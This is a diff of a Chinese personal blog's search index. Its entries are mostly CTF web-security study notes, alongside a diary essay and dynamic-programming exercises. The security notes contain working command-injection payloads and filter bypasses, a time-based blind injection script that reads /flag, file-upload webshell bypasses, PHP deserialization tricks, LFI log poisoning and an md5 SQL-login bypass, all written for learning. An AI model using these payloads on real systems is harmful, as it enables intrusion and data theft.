-<p>相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</p>
-<p>9、__set_state</p>
-<p>当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ &#x3D;&gt; value, …)格式排列的类属性。</p>
-<p>10、__invoke</p>
-<p>当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效</p>
-<p>11、__callStatic</p>
-<p>它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。</p>
-<p>同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</p>
-<p>序列化格式中的字母含义：</p>
-<pre><code>a - array                    b - boolean  
-d - double                   i - integer
-o - common object            r - reference
-s - string                   C - custom object
-O - class                  N - null
-R - pointer reference      U - unicode string
-</code></pre>
-<h3 id="POP链利用技巧"><a href="#POP链利用技巧" class="headerlink" title="POP链利用技巧"></a>POP链利用技巧</h3><h4 id="一些有用的POP链中出现的方法"><a href="#一些有用的POP链中出现的方法" class="headerlink" title="一些有用的POP链中出现的方法"></a>一些有用的POP链中出现的方法</h4><ul>
-<li>命令执行：exec()、passthru()、popen()、system()</li>
-<li>文件操作：file_put_contents()、file_get_contents()、unlink()</li>
-<li>代码执行：eval()、assert()、call_user_func()</li>
-</ul>
-<h4 id="反序列化十六进制绕过关键字"><a href="#反序列化十六进制绕过关键字" class="headerlink" title="反序列化十六进制绕过关键字"></a>反序列化十六进制绕过关键字</h4><p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过<br><code>s:4:&quot;user&quot;; -&gt; S:4:&quot;use\72&quot;;</code><br>在反序列化时，序列化中的十六进制会被转化成字母<br>当过滤了c2e38 ，即可用 \63\32\65\33\38 替代，S解析十六进制<br>username:y1ng\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0<br>password:”;S:11:”\00*\00password”;O:8:”Hacker_A”:1:{S:5:”\63\32\65\33\38”;O:8:”Hacker_B”:1:{S:5:”\63\32\65\33\38”;O:8:”Hacker_C”:1:{s:4:”name”;s:4:”test”;}}};s:1:”a”;s:0:”</p>
-<p>\00 会被替换为 %00<br>\65 会被替换为 e</p>
-<p>过滤了%00，可用S来代替序列化字符串的s来绕过，在S情况下\00 会被解析成%00</p>
-<p>序列化时类中私有变量和受保护变量，php7.1+ 对属性并不敏感，public 也可用于protected：<br>private反序列化后是%00(类名)%00(变量名)，protect是%00*%00(变量名)</p>
-<h4 id="深浅copy"><a href="#深浅copy" class="headerlink" title="深浅copy"></a>深浅copy</h4><p>在php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。<br><code>$A = &amp;$B;</code></p>
-<h4 id="利用PHP伪协议"><a href="#利用PHP伪协议" class="headerlink" title="利用PHP伪协议"></a>利用PHP伪协议</h4><p>配合PHP伪协议实现文件包含、命令执行等漏洞。如glob:&#x2F;&#x2F; 伪协议查找匹配的文件路径模式</p>
-<h4 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h4><p>a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+    <title>session伪造</title>
+    <url>/2023/05/22/session%E4%BC%AA%E9%80%A0/</url>
+    <content><![CDATA[<p>python flask_session_cookie_manager3.py decode -c “session值” -s “key值”<br>python flask_session_cookie_manager3.py encode -s “key值” -t “我们需要伪造的值”</p>
 ]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>prize_p1</title>
-    <url>/2023/05/26/prize-p1/</url>
-    <content><![CDATA[]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
@@ -1540,6 +1845,43 @@ re.findall(&quot;style/\w&#123;60&#125;.jpg&quot;,&quot;&quot;)
       </tags>
   </entry>
   <entry>
+    <title>命令执行</title>
+    <url>/2023/05/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<p>以下介绍为 PHP 环境</p>
+<p>用于命令执行的函数有</p>
+<p>system<br>exec<br>passthru<br>shell_exec</p>
+<p>windows支持：<br>|直接执行后面的语句 ping 127.0.0.1|whoami<br>||前面出错执行后面的，前面为假 ping 2|| whoami<br>&amp;前面的语句为假则直接执行后面的,前面可真可假ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p>
+<p>Linux支持：<br>;前面的执行完执行后面的 ping 127.0.0.1;whoami<br>丨管道符，显示后面的执行结果 ping 127.0.0.1|whoami<br>||当前面的执行出错时执行后面的 ping 1||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p>
+<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>$IFS<br>${IFS}<br>$IFS$1<br>%09<br>{cat,flag.php}</p>
+<h4 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h4><p>fla\g<br>a&#x3D;g;fla$a<br>?url&#x3D;127.0.0.1|<code>echo%09WTJGMElDOWxkR012TG1acGJtUm1iR0ZuTDJac1lXY3VkSGgw|base64%09-d|base64%09-d</code><br>两次编码</p>
+<p>先执行反引号内的东西<br>ls <code>cat /flag &gt; /var/www/html/1.txt</code></p>
+<p>或者使用 $() 和八进制<br>$()：这是一种命令替换的语法，它会执行括号内的命令，并将其结果返回给外部命令。<br>$(printf$IFS$9”\154\163”)<br>无回显盲注脚本</p>
+<pre><code class="python">import requests
+import time
+
+s=requests.session()
+flag=&#39;&#39;
+for z in range(1,50):
+    for i in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_!@#%|^&amp;&#123;&#125;[]/-()+=,\\&#39;:
+        starTime=time.time()
+        url=&quot;http://127.0.0.1/?cmd=if [ `cut -c&quot;+str(z)+&quot;-&quot;+str(z)+&quot; /flag` != &#39;&quot;+i+&quot;&#39; ]; then echo 1 ; else sleep 3; fi&quot;
+        r=s.get(url)
+        if((time.time()-starTime)&gt;3):
+            flag+=i
+            print(flag)
+            break
+    print(z)
+print(&#39;the flag is&#39;+flag)
+</code></pre>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pythonlist</title>
     <url>/2023/04/21/pythonlist/</url>
     <content><![CDATA[<h4 id="str"><a href="#str" class="headerlink" title="str"></a>str</h4><ul>
@@ -1627,27 +1969,27 @@ re.findall(&quot;style/\w&#123;60&#125;.jpg&quot;,&quot;&quot;)
       </tags>
   </entry>
   <entry>
-    <title>session伪造</title>
-    <url>/2023/05/22/session%E4%BC%AA%E9%80%A0/</url>
-    <content><![CDATA[<p>python flask_session_cookie_manager3.py decode -c “session值” -s “key值”<br>python flask_session_cookie_manager3.py encode -s “key值” -t “我们需要伪造的值”</p>
+    <title>应是天仙狂醉，乱把白云揉碎</title>
+    <url>/2023/04/18/%E5%BA%94%E6%98%AF%E5%A4%A9%E4%BB%99%E7%8B%82%E9%86%89%EF%BC%8C%E4%B9%B1%E6%8A%8A%E7%99%BD%E4%BA%91%E6%8F%89%E7%A2%8E/</url>
+    <content><![CDATA[<blockquote>
+<p>人是一根会思想的苇草</p>
+</blockquote>
+<p>这是一场非正式会谈，我与我的。</p>
+<p>我这一生最讨厌三种人，欺骗、不守约定、孰若无睹，事实上，无比憎恨。</p>
+<p>想必这和我的经历有关，但我也不愿提及，就此散去吧。</p>
+<p>忽然想来，18年来，没有一日不彷徨无知，我还未曾真正瞧过自己一眼，或许瞧过，未曾入眼。</p>
+<p>讨厌的事情总是莫名其妙，就好像我不喜欢下雨，却又喜欢淋雨，或许这就是我的归宿，我也无力改变，但是我又的的确确要做些什么。倘若什么都不做，任由雨打满身，那也有点可悲，我不惧雨淋，不惧湿身，但也要在淋雨时迎风跑起，让那雨更猛烈的捶打着我，下次再遇见这雨，可就亲切又自然了。</p>
+<p>雨淋多了，总是会生病的。可能我也病了，我也不例外，这世界上病的人当然很多，病的千奇百怪，却没有人与我相似。在迷茫中寻求希望，未免是有点天真无知的。我不妄想希望的存在，我想成为自己的希望，千真万确。虽然听起来，更像是妄想。</p>
+<p>我又何尝不知我是在画地为牢，那又如何，属于我的一隅之地，也容许我孤芳自赏，这里不因是我的囚笼，这是我的天堂，我孤身起舞，不辜负我孤傲的人生。</p>
+<blockquote>
+<p>2023 4 18 萃文楼<br> 无法顶格空格的事，姑且下次再谈吧</p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>网络安全</category>
+        <category>日常</category>
       </categories>
       <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>something]</title>
-    <url>/2023/05/14/something/</url>
-    <content><![CDATA[<p>nginx服务器<br><?php include($_GET['url']);?><br>查看日志<br>?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
+        <tag>不是好事</tag>
       </tags>
   </entry>
   <entry>
@@ -1680,6 +2022,7 @@ eval($code);
 preg_match(&#39;/utils\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;]) utils.php/%88 即可绕过
 preg_match(&#39;/show_source/&#39;, $_SERVER[&#39;REQUEST_URI&#39;]) 用show.source或show[source绕过
 </code></pre>
+<p>intval() 是 PHP 中的一个函数，它用来获取变量的整数值。这个函数将会返回变量的整数表示，如果该变量不能转换为整数，那么返回 0。</p>
 <p>变量拼接<br>?ip&#x3D;127.0.0.1;a&#x3D;ag;b&#x3D;fl;cat$IFS$9$b$a.php</p>
 <p>base64编码<br>;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p>
 <ul>
@@ -1700,11 +2043,22 @@ echo mt_rand().&quot;###&quot;;
 echo mt_rand().&quot;###&quot;;
 ?&gt; 
 </code></pre>
-<p>得到结果<br>895547922###2141438069###1546885062###<br>895547922###2141438069### </p>
+<p>得到结果<br>895547922###2141438069###1546885062###<br>895547922###2141438069###</p>
 <p>原因：在&#x2F;ext&#x2F;standard&#x2F;rand.c中可以看到，播完种后，将会将 mt_rand_is_seeded 的值设置为1，因此mt_rand只播种一次</p>
-<p>使用：<br>┌──(sein㉿kali)-[~&#x2F;php_mt_seed-4.0]<br>└─$ time .&#x2F;php_mt_seed 1093633598 </p>
+<p>使用：<br>┌──(sein㉿kali)-[~&#x2F;php_mt_seed-4.0]<br>└─$ time .&#x2F;php_mt_seed 1093633598</p>
 <h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><p>布尔类型True与非零非NULL变量比较都会是True</p>
 <p>其中用到了md5($pass,true)<br>第二个参数true会将md5值用原始的6字符输出，<br>在网上搜索后发现这个可以用ffifdyop绕过，绕过原理是：ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是’ or ‘6，而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5($pass,true)函数</p>
+<h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p> 函数搜索数组中是否存在指定的值。<br> <code>in_array(search, array, type)</code><br> mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置</p>
+<pre><code class="php">mb_strpos (haystack ,needle )
+//haystack：要被检查的字符串。
+//needle：要搜索的字符串。
+</code></pre>
+<pre><code class="php">mb_substr() //函数返回字符串的一部分。
+
+//str 必需。从该 string 中提取子字符串。
+//start 必需。规定在字符串的何处开始。
+//ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾。
+</code></pre>
 ]]></content>
       <categories>
         <category>网络安全</category>
@@ -1814,43 +2168,6 @@ https://user:password@example.com
       </tags>
   </entry>
   <entry>
-    <title>命令执行</title>
-    <url>/2023/05/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<p>以下介绍为 PHP 环境</p>
-<p>用于命令执行的函数有</p>
-<p>system<br>exec<br>passthru<br>shell_exec</p>
-<p>windows支持：<br>|直接执行后面的语句 ping 127.0.0.1|whoami<br>||前面出错执行后面的，前面为假 ping 2|| whoami<br>&amp;前面的语句为假则直接执行后面的,前面可真可假ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p>
-<p>Linux支持：<br>;前面的执行完执行后面的 ping 127.0.0.1;whoami<br>丨管道符，显示后面的执行结果 ping 127.0.0.1|whoami<br>||当前面的执行出错时执行后面的 ping 1||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p>
-<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>$IFS<br>${IFS}<br>$IFS$1<br>%09<br>{cat,flag.php}</p>
-<h4 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h4><p>fla\g<br>a&#x3D;g;fla$a<br>?url&#x3D;127.0.0.1|<code>echo%09WTJGMElDOWxkR012TG1acGJtUm1iR0ZuTDJac1lXY3VkSGgw|base64%09-d|base64%09-d</code><br>两次编码</p>
-<p>先执行反引号内的东西<br>ls <code>cat /flag &gt; /var/www/html/1.txt</code></p>
-<p>或者使用 $() 和八进制<br>$()：这是一种命令替换的语法，它会执行括号内的命令，并将其结果返回给外部命令。<br>$(printf$IFS$9”\154\163”)<br>无回显盲注脚本</p>
-<pre><code class="python">import requests
-import time
-
-s=requests.session()
-flag=&#39;&#39;
-for z in range(1,50):
-    for i in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_!@#%|^&amp;&#123;&#125;[]/-()+=,\\&#39;:
-        starTime=time.time()
-        url=&quot;http://127.0.0.1/?cmd=if [ `cut -c&quot;+str(z)+&quot;-&quot;+str(z)+&quot; /flag` != &#39;&quot;+i+&quot;&#39; ]; then echo 1 ; else sleep 3; fi&quot;
-        r=s.get(url)
-        if((time.time()-starTime)&gt;3):
-            flag+=i
-            print(flag)
-            break
-    print(z)
-print(&#39;the flag is&#39;+flag)
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>动态规划(一)</title>
     <url>/2023/04/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B8%80/</url>
     <content><![CDATA[<blockquote>
@@ -1862,30 +2179,6 @@ print(&#39;the flag is&#39;+flag)
       </categories>
       <tags>
         <tag>动态规划</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>应是天仙狂醉，乱把白云揉碎</title>
-    <url>/2023/04/18/%E5%BA%94%E6%98%AF%E5%A4%A9%E4%BB%99%E7%8B%82%E9%86%89%EF%BC%8C%E4%B9%B1%E6%8A%8A%E7%99%BD%E4%BA%91%E6%8F%89%E7%A2%8E/</url>
-    <content><![CDATA[<blockquote>
-<p>人是一根会思想的苇草</p>
-</blockquote>
-<p>这是一场非正式会谈，我与我的。</p>
-<p>我这一生最讨厌三种人，欺骗、不守约定、孰若无睹，事实上，无比憎恨。</p>
-<p>想必这和我的经历有关，但我也不愿提及，就此散去吧。</p>
-<p>忽然想来，18年来，没有一日不彷徨无知，我还未曾真正瞧过自己一眼，或许瞧过，未曾入眼。</p>
-<p>讨厌的事情总是莫名其妙，就好像我不喜欢下雨，却又喜欢淋雨，或许这就是我的归宿，我也无力改变，但是我又的的确确要做些什么。倘若什么都不做，任由雨打满身，那也有点可悲，我不惧雨淋，不惧湿身，但也要在淋雨时迎风跑起，让那雨更猛烈的捶打着我，下次再遇见这雨，可就亲切又自然了。</p>
-<p>雨淋多了，总是会生病的。可能我也病了，我也不例外，这世界上病的人当然很多，病的千奇百怪，却没有人与我相似。在迷茫中寻求希望，未免是有点天真无知的。我不妄想希望的存在，我想成为自己的希望，千真万确。虽然听起来，更像是妄想。</p>
-<p>我又何尝不知我是在画地为牢，那又如何，属于我的一隅之地，也容许我孤芳自赏，这里不因是我的囚笼，这是我的天堂，我孤身起舞，不辜负我孤傲的人生。</p>
-<blockquote>
-<p>2023 4 18 萃文楼<br> 无法顶格空格的事，姑且下次再谈吧</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>日常</category>
-      </categories>
-      <tags>
-        <tag>不是好事</tag>
       </tags>
   </entry>
   <entry>
@@ -1946,7 +2239,11 @@ print(&#39;the flag is&#39;+flag)
 <p>LoadModule rewrite_module modules&#x2F;mod_rewrite.so</p>
 <p>AllowOverride All（默认为None）</p>
 <p>.htaccess文件中有两种写法</p>
-<p>&lt;FilesMatch “xxx.png”&gt;<br>SetHandler application&#x2F;x-httpd-php<br></FilesMatch><br>xxx.png即可作为php脚本解析</p>
+<pre><code class="bash">&lt;FilesMatch &quot;xxx.png&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+xxx.png即可作为php脚本解析
+</code></pre>
 <p>或者是</p>
 <p>AddType application&#x2F;x-httpd-php .gif<br>.gif为后缀额度文件都当做php解析</p>
 <p>后缀大小写绕过<br>应用场景：没有将文件后缀统一转换为大写或者是小写，而黑名单不严谨。</p>
@@ -1963,18 +2260,17 @@ print(&#39;the flag is&#39;+flag)
 <p>利用方法：</p>
 <p>可以上传一个这样的.user.ini</p>
 <p>auto_prepend_file &#x3D; xxx.jpg<br>然后再上传一个图片马xxx.jpg</p>
-<script language='php'>system('whoami');</script>
-<p>如果在上传目录中还有一个可执行的php文件，访问php文件，就达到了执行系统命令的效果。</p>
+<p><code>&lt;script language=&#39;php&#39;&gt;system(&#39;whoami&#39;);&lt;/script&gt;</code><br>如果在上传目录中还有一个可执行的php文件，访问php文件，就达到了执行系统命令的效果。</p>
 <p>总结一下：上传目录中有一个可执行的php文件，我们先上传一个.user.ini文件，这个文件的内容为auto_prepend_file&#x3D;xxx.jpg。起到的作用相当于在可执行的php文件前插入图片马中的内容。然后图片马中的恶意代码也会被当做PHP解析。</p>
 <p>补充：利用操作系统特性-Windows<br>利用Windows对于文件和文件名的限制，以下字符放在结尾时，不符合操作系统的命名规范，在最后生成文件时，字符会被自动去除。</p>
-<p>上传文件名	服务器文件名	说明<br>file.php[空格]	file.php	<br>file.php[.]	file.php	无论多少个.都可以<br>file.php[%80-%99]	file.php	Burp抓包，在文件名结尾输%80，CTRL+SHIFT+U进行URL-DECODE,或者增加一个空格，再在HEX视图中把20修改为80<br>上传文件名	服务器生成文件名	内容<br>file.php::$DATA	file.php	file.php中的实际内容<br>file.php::$DATA……	file.php	实际<br>空格绕过<br>应用场景：服务器为Windows平台，在对用户上传的文件名进行处理时，没有使用trim()函数去除字符串收尾处的空白字符。</p>
+<p>上传文件名服务器文件名说明<br>file.php[空格]file.php<br>file.php[.]file.php无论多少个.都可以<br>file.php[%80-%99]file.phpBurp抓包，在文件名结尾输%80，CTRL+SHIFT+U进行URL-DECODE,或者增加一个空格，再在HEX视图中把20修改为80<br>上传文件名服务器生成文件名内容<br>file.php::$DATAfile.phpfile.php中的实际内容<br>file.php::$DATA……file.php实际<br>空格绕过<br>应用场景：服务器为Windows平台，在对用户上传的文件名进行处理时，没有使用trim()函数去除字符串收尾处的空白字符。</p>
 <p>利用方式：用户上传图片马时，用Burp拦截，在文件尾部加入空格。例如：xxx.jpg空格。带有空格的后缀可以绕过黑名单的检测，而文件存在在Windows服务器上，会自动去除后缀中的空格。</p>
 <p>点绕过<br>应用场景：Windows平台，服务端没有使用deldot()删除文件名末尾的点。</p>
 <p>利用方式：上传名为assert.php.的文件。在Windows服务器中，后缀名之后的点，在保存时，会被自动忽略。</p>
 <p>::$DATA绕过<br>应用场景：Windows平台，没有使用str_ireplace()将::$DATA替换为空，导致可以利用NTFS文件流特性。</p>
 <p>利用方式：</p>
 <p>假设xxx.php的内容为<?php phpinfo();?></p>
-<p>上传的文件名	服务器表面现象	生成的文件内容<br>xxx.php:a.jpg	生成xxx.php	空<br>xxx.php::$DATA	生成xxx.php	<?php phpinfo();?><br>xxx.php::$INDEX_ALLOCATION	生成xxx.php文件夹	<br>xxx.php::$DATA.jpg	生成0.jpg	<?php phpinfo();?><br>xxx.php::$DATA\aaa.jpg	生成aaa.jpg	<?php phpinfo();?><br>这里，我们上传一个名为xxx.php::$DATA的木马，然后，在浏览器中访问xxx.php。</p>
+<p>上传的文件名服务器表面现象生成的文件内容<br>xxx.php:a.jpg生成xxx.php空<br>xxx.php::$DATA生成xxx.php<?php phpinfo();?><br>xxx.php::$INDEX_ALLOCATION生成xxx.php文件夹<br>xxx.php::$DATA.jpg生成0.jpg<?php phpinfo();?><br>xxx.php::$DATA\aaa.jpg生成aaa.jpg<?php phpinfo();?><br>这里，我们上传一个名为xxx.php::$DATA的木马，然后，在浏览器中访问xxx.php。</p>
 <p>双后缀名绕过<br>应用场景：黑名单、使用str_ireplace()将匹配到的黑名单中的内容替换为空。</p>
 <p>利用方式：因为仅将黑名单中的内容一次替换为空，可以重写绕过。</p>
 <p>xxx.phphpp</p>
@@ -2144,41 +2440,6 @@ imagepng($img,'./idat.png');
       </tags>
   </entry>
   <entry>
-    <title>洛谷p1616</title>
-    <url>/2023/04/19/%E6%B4%9B%E8%B0%B7p1616/</url>
-    <content><![CDATA[<h1 id="疯狂的采药"><a href="#疯狂的采药" class="headerlink" title="疯狂的采药"></a>疯狂的采药</h1><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>此题为纪念 LiYuxiang 而生。</p>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>LiYuxiang 是个天资聪颖的孩子，他的梦想是成为世界上最伟大的医师。为此，他想拜附近最有威望的医师为师。医师为了判断他的资质，给他出了一个难题。医师把他带到一个到处都是草药的山洞里对他说：“孩子，这个山洞里有一些不同种类的草药，采每一种都需要一些时间，每一种也有它自身的价值。我会给你一段时间，在这段时间里，你可以采到一些草药。如果你是一个聪明的孩子，你应该可以让采到的草药的总价值最大。”</p>
-<p>如果你是 LiYuxiang，你能完成这个任务吗？</p>
-<p>此题和原题的不同点：</p>
-<p>$1$. 每种草药可以无限制地疯狂采摘。</p>
-<p>$2$. 药的种类眼花缭乱，采药时间好长好长啊！师傅等得菊花都谢了！</p>
-<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入第一行有两个整数，分别代表总共能够用来采药的时间 $t$ 和代表山洞里的草药的数目 $m$。</p>
-<p>第 $2$ 到第 $(m + 1)$ 行，每行两个整数，第 $(i + 1)$ 行的整数 $a_i, b_i$ 分别表示采摘第 $i$ 种草药的时间和该草药的价值。</p>
-<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行，这一行只包含一个整数，表示在规定的时间内，可以采到的草药的最大总价值。</p>
-<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code>70 3
-71 100
-69 1
-1 2
-</code></pre>
-<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code>140
-</code></pre>
-<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><ul>
-<li>对于 $30%$ 的数据，保证 $m \le 10^3$ 。</li>
-<li>对于 $100%$ 的数据，保证 $1 \leq m \le 10^4$，$1 \leq t \leq 10^7$，且 $1 \leq m \times t \leq 10^7$，$1 \leq a_i, b_i \leq 10^4$。</li>
-</ul>
-<blockquote>
-<p>显然这个一个完全背包问题，对于完全背包问题的求解</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>动态规划</tag>
-        <tag>背包问题</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>过河卒</title>
     <url>/2023/04/26/%E8%BF%87%E6%B2%B3%E5%8D%92/</url>
     <content><![CDATA[<pre><code class="cpp">#include&lt;iostream&gt;
@@ -2233,6 +2494,41 @@ int main() &#123;
       </categories>
       <tags>
         <tag>动态规划</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>洛谷p1616</title>
+    <url>/2023/04/19/%E6%B4%9B%E8%B0%B7p1616/</url>
+    <content><![CDATA[<h1 id="疯狂的采药"><a href="#疯狂的采药" class="headerlink" title="疯狂的采药"></a>疯狂的采药</h1><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>此题为纪念 LiYuxiang 而生。</p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>LiYuxiang 是个天资聪颖的孩子，他的梦想是成为世界上最伟大的医师。为此，他想拜附近最有威望的医师为师。医师为了判断他的资质，给他出了一个难题。医师把他带到一个到处都是草药的山洞里对他说：“孩子，这个山洞里有一些不同种类的草药，采每一种都需要一些时间，每一种也有它自身的价值。我会给你一段时间，在这段时间里，你可以采到一些草药。如果你是一个聪明的孩子，你应该可以让采到的草药的总价值最大。”</p>
+<p>如果你是 LiYuxiang，你能完成这个任务吗？</p>
+<p>此题和原题的不同点：</p>
+<p>$1$. 每种草药可以无限制地疯狂采摘。</p>
+<p>$2$. 药的种类眼花缭乱，采药时间好长好长啊！师傅等得菊花都谢了！</p>
+<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入第一行有两个整数，分别代表总共能够用来采药的时间 $t$ 和代表山洞里的草药的数目 $m$。</p>
+<p>第 $2$ 到第 $(m + 1)$ 行，每行两个整数，第 $(i + 1)$ 行的整数 $a_i, b_i$ 分别表示采摘第 $i$ 种草药的时间和该草药的价值。</p>
+<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行，这一行只包含一个整数，表示在规定的时间内，可以采到的草药的最大总价值。</p>
+<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code>70 3
+71 100
+69 1
+1 2
+</code></pre>
+<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code>140
+</code></pre>
+<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><ul>
+<li>对于 $30%$ 的数据，保证 $m \le 10^3$ 。</li>
+<li>对于 $100%$ 的数据，保证 $1 \leq m \le 10^4$，$1 \leq t \leq 10^7$，且 $1 \leq m \times t \leq 10^7$，$1 \leq a_i, b_i \leq 10^4$。</li>
+</ul>
+<blockquote>
+<p>显然这个一个完全背包问题，对于完全背包问题的求解</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>动态规划</tag>
+        <tag>背包问题</tag>
       </tags>
   </entry>
 </search>
